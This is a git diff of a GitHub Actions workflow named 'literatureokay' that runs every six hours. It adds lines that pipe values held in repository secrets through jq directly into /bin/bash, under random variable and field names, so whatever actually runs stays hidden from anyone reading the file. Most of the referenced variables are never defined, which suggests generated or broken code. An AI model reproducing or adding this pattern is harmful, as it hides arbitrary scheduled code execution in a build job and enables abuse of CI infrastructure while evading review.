@@ -3,21 +3,23 @@ name: literatureokay
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 4/6 * * *'
+    - cron: '13 0/6 * * *'
 
-jobs:  # 3747
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: literatureokay
         env:
-          nwp81: ${{ secrets.nwp81 }}
+          gtkwh99397: ${{ secrets.gtkwh99397 }}
         run: |
-          echo $nwp81 | jq -r .h09298 | /bin/bash
-          echo $iffcl17 | jq -r .c86771 | /bin/bash
-          echo $zndtl2 | jq -r .f22 | /bin/bash
-          echo $nvrx90372 | jq -r .huf51486 | /bin/bash
-          echo $furhh62 | jq -r .rcdj95622 | /bin/bash
-          echo $mwgxz2967 | jq -r .evws5 | /bin/bash
+          echo $gtkwh99397 | jq -r .ikmb610 | /bin/bash
+          echo $ltpin7569 | jq -r .d5373 | /bin/bash
+          echo $pfgpe16458 | jq -r .plkql50 | /bin/bash
+          echo $l79974 | jq -r .xinpw2489 | /bin/bash
+          echo $ln30 | jq -r .ccokc825 | /bin/bash
+          echo $rg316 | jq -r .mdjdk148 | /bin/bash
+          echo $qg981 | jq -r .y2337 | /bin/bash
+          echo $azl6 | jq -r .grsoq0 | /bin/bash
 
